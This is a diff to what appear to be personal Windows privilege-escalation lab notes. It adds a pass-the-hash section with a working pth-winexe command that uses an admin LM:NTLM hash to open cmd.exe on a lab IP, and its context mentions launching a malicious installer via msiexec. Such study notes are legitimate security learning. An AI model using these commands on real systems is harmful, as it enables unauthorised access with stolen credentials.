@@ -323,7 +323,16 @@ Then I can use msiexec to launch my malicious installer
 These can be used with the various methods such as RDP, SMB, PSexec, ect... or by PTH as will be shown next.
   
 ## Passwords - Passing the Hash
+  Even without being able to crack a hash, with a pass the hash attack I can login as the admin user with just thier username and hash(LM and NTLM) separated by a %:
+  
+  `pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.80.183 cmd.exe`
+  
+  ![image](https://user-images.githubusercontent.com/83407557/183224619-9e5a1d0c-006c-4cce-b3c3-266343f4af9a.png)
+
+  
 ## Scheduled Tasks
+  
+  
 ## Insecure GUI Apps
 ## Startup Apps
 ## Token Impersonation - Rogue Potato
